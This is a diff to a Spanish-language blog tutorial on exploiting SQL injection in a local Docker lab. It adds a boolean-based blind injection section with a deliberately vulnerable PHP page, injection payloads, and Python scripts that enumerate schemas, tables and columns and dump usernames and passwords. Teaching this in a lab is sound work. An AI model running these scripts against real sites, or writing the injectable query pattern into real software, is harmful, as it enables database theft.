@@ -40,7 +40,7 @@
           <p>Explotación de SQL Injection en mysql</p>
         </div>
 
- <div><strong><h3>Preparación</h3></strong></div><br>
+ <br><div><strong><h3>Preparación</h3></strong></div><br>
 
 <div><p>Necesitamos crear un entorno vulnerable en mi caso usare docker, instalamos algunas cosas</p></div>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
@@ -220,7 +220,7 @@ $results </span><span class="kd">=</span><span class="k"> mysqli_query</span><sp
 ?></span>
 </code></pre></div></div><br>
 
-<div><strong><h3>Authentication Bypass</h3></strong></div><br>
+<br><div><strong><h3>Authentication Bypass</h3></strong></div><br>
 
 <div><p>Tenemos los archivos y estamos corriendo el servicio, veamos el login.php</p></div>
 <div><p><img src="./1.png"></p></div>
@@ -252,7 +252,7 @@ $results </span><span class="kd">=</span><span class="k"> mysqli_query</span><sp
 
 <div><p>Cierra la query con ' pero no hay un usuario sin contenido, para eso sirve or 1=1, si el usuario es incorrecto comparará que 1 sea igual a 1 cuando haga eso dará la query como correcta</p></div><br>
 
-<div><strong><h3>SQL Injection Union Based</h3></strong></div><br>
+<br><div><strong><h3>SQL Injection Union Based</h3></strong></div><br>
 <div><p>Una vez autenticados nos redirige a example.php que tiene un campo de user id</p></div>
 <div><p><img src="./5.png"></p></div><br>
 
@@ -328,8 +328,236 @@ $results </span><span class="kd">=</span><span class="k"> mysqli_query</span><sp
 </code></pre></div></div>
 <a href="./18.png" target="_blank"><div><p><img src="./18.png"><p></div></a><br>
 
+<br><div><strong><h3>SQL Injection Boolean Based</h3></strong></div><br>
+
+<div><p>Para explotar la sqli basada en boolean dejaremos el example.php de esta manera</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+
+$dbhostname </span><span class="kd">=</span><span class="s2"> 'localhost'</span><span class="p">;
+$dbuser </span><span class="kd">=</span><span class="s2"> 'user'</span><span class="p">;
+$dbpassword </span><span class="kd">=</span><span class="s2"> 'password'</span><span class="p">;
+$dbname </span><span class="kd">=</span><span class="s2"> 'example'</span><span class="p">;
+
+$connection </span><span class="kd">=</span><span class="k"> mysqli_connect</span><span class="p">($dbhostname, $dbuser, $dbpassword, $dbname);
+
+$input </span><span class="kd">=</span><span class="p"> $_GET[</span><span class="s2">'id'</span><span class="p">];
+
+$query </span><span class="kd">=</span><span class="s2"> "SELECT id, role, username FROM users WHERE id='$input'"</span><span class="p">;
+
+$results </span><span class="kd">=</span><span class="k"> mysqli_query</span><span class="p">($connection, $query);
+
+</span><span class="kd">while </span><span class="p">($rows </span><span class="kd">=</span><span class="k"> mysqli_fetch_assoc</span><span class="p">($results)) {
+    </span><span class="kd">echo </span><span class="s2">"Query was successfully"</span><span class="p">;
+}
+
+?></span>
+</code></pre></div></div><br>
+
+<div><p>De esta manera cuando la query sea correcta nos dira que es correcta de lo contrario no devolvera nada, hagamos una prueba rapida</p></div>
+
+<div><p>En esta query podemos ver que es igual a el primer caracter de la base de datos que es e</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">MariaDB [example]> </span><span class="p">select substr(database(),1,1);
++------------------------+
+| substr(database(),1,1) |
++------------------------+
+| e                      |
++------------------------+
+1 row in set (0.002 sec)
+
+</span><span class="kd">MariaDB [example]></span>
+</code></pre></div></div><br>
+
+<div><p>En la web ejecutamos una condicional, y al decirle que la query es igual a e nos devuelve 'Query was successfully'</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'and (select substr(database(),1,1))='e'-- -</span>
+</code></pre></div></div>
+<a href="./19.png" target="_blank"><div><p><img src="./19.png"><p></div></a><br>
+
+<div><p>Si le pasamos un valor incorrecto como i no nos devuelve nada, la pagina esta en blanco</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'and (select substr(database(),1,1))='i'-- -</span>
+</code></pre></div></div>
+<a href="./20.png" target="_blank"><div><p><img src="./20.png"><p></div></a><br>
+
+<div><p>Podemos usar este condicional para iterar por cada caracter y por posiciones, pero mas que hacerlo manual podemos automatizarlo en un script de python</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import</span><span class="p"> log
+</span><span class="kd">import</span><span class="p"> string, requests
+
+characters </span><span class="kd">=</span><span class="p"> string.ascii_lowercase
+bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">"Database"</span><span class="p">)
+
+value </span><span class="kd">=</span><span class="s2"> ""
+
+</span><span class="kd">for </span><span class="p">position </span><span class="kd">in</span><span class="k"> range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">20</span><span class="p">):
+    </span><span class="kd">for </span><span class="p">character </span><span class="kd">in</span><span class="p"> characters:
+        request </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://172.17.0.2/example.php?id=1'and (select substr(database(),{position},1))='{character}'-- -"</span><span class="p">)
+        </span><span class="kd">if </span><span class="p">request.text </span><span class="kd">==</span><span class="s2"> "Query was successfully"</span><span class="p">:
+            value </span><span class="kd">+=</span><span class="p"> character
+            bar.status(value)</span>
+</code></pre></div></div><br>
+
+<div><p>Al ejecutar el script nos devuelve la base de datos actualmente en uso</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">◢</span><span class="p">] Database: example</span>
+</code></pre></div></div><br>
+
+<div><p>Modificamos el script de la siguiente manera para enumerar todas las bases de datos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">string, requests
+
+characters </span><span class="kd">=</span><span class="p"> string.ascii_lowercase </span><span class="kd">+</span><span class="p"> string.punctuation
+bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">"Databases"</span><span class="p">)
+
+value </span><span class="kd">=</span><span class="s2"> ""
+
+</span><span class="kd">for</span><span class="p"> db </span><span class="kd">in</span><span class="k"> range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">5</span><span class="p">):
+    value </span><span class="kd">+=</span><span class="s2"> "\n\033[1;37m[\033[1;34m*\033[1;37m] "
+    </span><span class="kd">for </span><span class="p">position </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">20</span><span class="p">):
+        </span><span class="kd">for </span><span class="p">character </span><span class="kd">in </span><span class="p">characters:
+            request </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://172.17.0.2/example.php?id=1'and (select substr(schema_name,{position},1) from information_schema.schemata limit {db},1)='{character}'-- -"</span><span class="p">)
+            </span><span class="kd">if </span><span class="p">request.text </span><span class="kd">==</span><span class="s2"> "Query was successfully"</span><span class="p">:
+                value </span><span class="kd">+=</span><span class="p"> character
+                bar.status(value)</span>
+</code></pre></div></div><br>
+
+<div><p>Lo ejecutamos y ahora nos muestra todas las bases de datos existentes, entre ellas example</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">◢</span><span class="p">] Databases: 
+    [</span><span class="na">*</span><span class="p">] information_schema
+    [</span><span class="na">*</span><span class="p">] mysql
+    [</span><span class="na">*</span><span class="p">] performance_schema
+    [</span><span class="na">*</span><span class="p">] sys
+    [</span><span class="na">*</span><span class="p">] example</span>
+</code></pre></div></div><br>
+
+<div><p>Siguiendo la misma lógica modificamos el script para enumerar las tablas de la db example</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">string, requests
+
+characters </span><span class="kd">=</span><span class="p"> string.ascii_lowercase
+bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">"Tables"</span><span class="p">)
+
+value </span><span class="kd">=</span><span class="s2"> ""</span><span class="p">
+
+</span><span class="kd">for </span><span class="p">table </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">3</span><span class="p">):
+    value </span><span class="kd">+=</span><span class="s2"> "\n\033[1;37m[\033[1;34m*\033[1;37m] "
+    </span><span class="kd">for </span><span class="p">position </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">10</span><span class="p">):
+        </span><span class="kd">for </span><span class="p">character </span><span class="kd">in </span><span class="p">characters:
+            request </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://172.17.0.2/example.php?id=1'and (select substr(table_name,{position},1) from information_schema.tables where table_schema='example' limit {table},1)='{character}'-- -"</span><span class="p">)
+            </span><span class="kd">if </span><span class="p">request.text </span><span class="kd">== </span><span class="s2">"Query was successfully"</span><span class="p">:
+                value </span><span class="kd">+=</span><span class="p"> character
+                bar.status(value)</span>
+</code></pre></div></div><br>
+
+<div><p>Al ejecutarlo podemos ver que existe la tabla users en la base de datos example</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">◢</span><span class="p">] Tables: 
+    [</span><span class="na">*</span><span class="p">] users</span>
+</code></pre></div></div><br>
+
+<div><p>Modificamos de nuevo el script ahora para enumerar las columnas de la tabla users</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">string, requests
+
+characters </span><span class="kd">=</span><span class="p"> string.ascii_lowercase
+bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="s2">"Columns"</span><span class="p">)
+
+value </span><span class="kd">=</span><span class="s2"> ""
+
+</span><span class="kd">for </span><span class="p">column </span><span class="kd">in</span><span class="k"> range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">5</span><span class="p">):
+    value </span><span class="kd">+=</span><span class="s2"> "\n\033[1;37m[\033[1;34m*\033[1;37m] "
+    </span><span class="kd">for </span><span class="p">position </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">10</span><span class="p">):
+        </span><span class="kd">for </span><span class="p">character </span><span class="kd">in </span><span class="p">characters:
+            request </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://172.17.0.2/example.php?id=1'and (select substr(column_name,{position},1) from information_schema.columns where table_schema='example' and table_name='users' limit {column},1)='{character}'-- -"</span><span class="p">)
+            </span><span class="kd">if </span><span class="p">request.text </span><span class="kd">==</span><span class="s2"> "Query was successfully"</span><span class="p">:
+                value </span><span class="kd">+=</span><span class="p"> character
+                bar.status(value)</span>
+</code></pre></div></div><br>
+
+<div><p>Al ejecutarlo podemos ver las columnas id, role, username y password</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">◢</span><span class="p">] Columns:
+    [</span><span class="na">*</span><span class="p">] id
+    [</span><span class="na">*</span><span class="p">] role
+    [</span><span class="na">*</span><span class="p">] username
+    [</span><span class="na">*</span><span class="p">] password</span>
+</code></pre></div></div><br>
+
+<div><p>Ahora modificaremos de nuevo, pero iteraremos por cada columna para sacar los datos de cada una, de la siguiente forma</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log
+</span><span class="kd">import </span><span class="p">string, requests
+
+characters </span><span class="kd">=</span><span class="p"> string.ascii_lowercase </span><span class="kd">+</span><span class="p"> string.digits </span><span class="kd">+</span><span class="p"> string.punctuation </span><span class="kd">+</span><span class="p"> string.whitespace
+
+columns </span><span class="kd">=</span><span class="p"> [</span><span class="s2">"id"</span><span class="p">, </span><span class="s2">"role"</span><span class="p">, </span><span class="s2">"username"</span><span class="p">, </span><span class="s2">"password"</span><span class="p">]
+
+</span><span class="kd">for </span><span class="p">column </span><span class="kd">in </span><span class="p">columns:
+    </span><span class="k">print</span><span class="p">(</span><span class="s2">"\r"</span><span class="p">)
+    bar </span><span class="kd">=</span><span class="p"> log.progress(</span><span class="k">f</span><span class="s2">"Dumpeando columna {column}"</span><span class="p">)
+
+    value </span><span class="kd">=</span><span class="s2"> ""</span><span class="p">
+
+    </span><span class="kd">for </span><span class="p">dump </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">5</span><span class="p">):
+        value </span><span class="kd">+=</span><span class="s2"> "\n\033[1;37m[\033[1;34m*\033[1;37m] "</span><span class="p">
+        </span><span class="kd">for </span><span class="p">position </span><span class="kd">in </span><span class="k">range</span><span class="p">(</span><span class="na">0</span><span class="p">,</span><span class="na">18</span><span class="p">):
+            </span><span class="kd">for </span><span class="p">character </span><span class="kd">in </span><span class="p">characters:
+                request </span><span class="kd">=</span><span class="p"> requests.get(</span><span class="k">f</span><span class="s2">"http://172.17.0.2/example.php?id=1' and (select substr({column},{position},1) from example.users limit {dump},1)='{character}'-- -"</span><span class="p">)
+                </span><span class="kd">if</span><span class="p"> request.text </span><span class="kd">==</span><span class="s2"> "Query was successfully"</span><span class="p">:
+                    value </span><span class="kd">+=</span><span class="p"> character
+                    bar.status(value)</span>
+</code></pre></div></div><br>
+
+<div><p>Finalmente ejecutamos el script y nos dumpea la info de todas las columnas una por una</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py
+[</span><span class="na">◢</span><span class="p">] Dumpeando columna id:
+    [</span><span class="na">*</span><span class="p">] 1
+    [</span><span class="na">*</span><span class="p">] 2
+    [</span><span class="na">*</span><span class="p">] 3
+    [</span><span class="na">*</span><span class="p">] 4
+    [</span><span class="na">*</span><span class="p">] 5
+
+[</span><span class="na">◢</span><span class="p">] Dumpeando columna role:
+    [</span><span class="na">*</span><span class="p">] noob
+    [</span><span class="na">*</span><span class="p">] hacker
+    [</span><span class="na">*</span><span class="p">] hacker
+    [</span><span class="na">*</span><span class="p">] pro hacker
+    [</span><span class="na">*</span><span class="p">] elite hacker
+
+[</span><span class="na">◢</span><span class="p">] Dumpeando columna username:
+    [</span><span class="na">*</span><span class="p">] gatogamer1155
+    [</span><span class="na">*</span><span class="p">] 0bfxgh0st
+    [</span><span class="na">*</span><span class="p">] eddiedota
+    [</span><span class="na">*</span><span class="p">] txhaka
+    [</span><span class="na">*</span><span class="p">] pascualropi
+
+[</span><span class="na">◢</span><span class="p">] Dumpeando columna password:
+    [</span><span class="na">*</span><span class="p">] gatogamer123!
+    [</span><span class="na">*</span><span class="p">] ghost1337!
+    [</span><span class="na">*</span><span class="p">] alvarovazques69!
+    [</span><span class="na">*</span><span class="p">] password123
+    [</span><span class="na">*</span><span class="p">] vulnwhatsapp413</span>
+</code></pre></div></div><br>
+
+
 <blockquote><strong><div><p>¡Proximamente!</p></div></strong>
-<div><p>En cuanto tenga un poco mas de tiempo actualizaré el post agregando otros tipos de inyecciones sql basadas en error, boolean y tiempo</p></div></blockquote><br>
+<div><p>En cuanto tenga un poco mas de tiempo actualizaré el post agregando otros tipos de inyecciones como sql basada en tiempo</p></div></blockquote><br>
 
 <p><a href="./../../">Página Principal</a></p>
 
